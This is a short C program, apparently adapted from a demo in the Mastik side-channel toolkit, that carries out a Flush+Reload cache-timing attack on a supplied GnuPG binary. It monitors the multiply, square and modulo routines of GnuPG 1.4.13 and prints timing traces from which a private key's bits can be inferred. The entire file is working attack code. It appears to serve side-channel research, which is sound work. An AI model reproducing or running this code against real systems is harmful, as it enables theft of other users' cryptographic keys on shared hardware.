/* Flush+Reload */
/* Adapted from demo/FR-gnupg-1.4.13.c */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mastik/symbol.h>
#include <mastik/fr.h>
#include <mastik/util.h>

#define SAMPLES 1000000
#define SLOT	2000
#define THRESHOLD 100

char *monitor[] = {
  "mpih-mul.c:488", /* Multiplication, mpihelp_mul */
  "mpih-mul.c:236", /* Square, mpih_sqr_n_basecase */
  "mpih-div.c:214"  /* Modulo, mpihelp_divrem */
};

int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

void usage(const char *prog) {
  fprintf(stderr, "Usage: %s <gpg-binary>\n", prog);
  exit(1);
}


int main(int ac, char **av) {
  char *binary = av[1];
  if (binary == NULL)
    usage(av[0]);

  fr_t fr = fr_prepare();
  for (int i = 0; i < nmonitor; i++) {
    uint64_t offset = sym_getsymboloffset(binary, monitor[i]);
    if (offset == ~0ULL) {
      fprintf(stderr, "Cannot find %s in %s\n", monitor[i], binary);
      exit(1);
    } 
    fr_monitor(fr, map_offset(binary, offset));
  }

  uint16_t *res = malloc(SAMPLES * nmonitor * sizeof(uint16_t));
  for (int i = 0; i < SAMPLES * nmonitor ; i+= 4096/sizeof(uint16_t))
    res[i] = 1;
  fr_probe(fr, res);

  int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, 1000);
  for (int i = 0; i < l; i++) {
    for (int j = 0; j < nmonitor; j++)
      printf("%d ", res[i * nmonitor + j]);
    putchar('\n');
  }

  free(res);
  fr_release(fr);
}
